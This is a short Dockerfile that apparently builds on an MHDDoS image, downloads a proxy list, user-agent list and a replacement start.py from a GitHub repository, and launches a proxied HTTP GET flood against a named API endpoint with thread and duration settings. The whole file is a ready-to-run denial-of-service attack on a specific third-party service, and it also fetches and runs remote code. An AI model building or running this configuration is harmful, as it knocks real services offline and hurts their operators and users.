FROM ghcr.io/mhprodev/mhddos:latest
RUN curl -o /app/files/proxies/h00.txt https://raw.githubusercontent.com/luresdither/hj/main/h00.txt
RUN curl -o /app/start.py https://raw.githubusercontent.com/luresdither/hj/main/start.py
RUN curl -o /app/files/useragent.txt https://raw.githubusercontent.com/luresdither/hj/main/useragent.txt
CMD ["get", "https://api.fanca.io/term/list", "1", "300", "h00.txt", "100", "800000"]
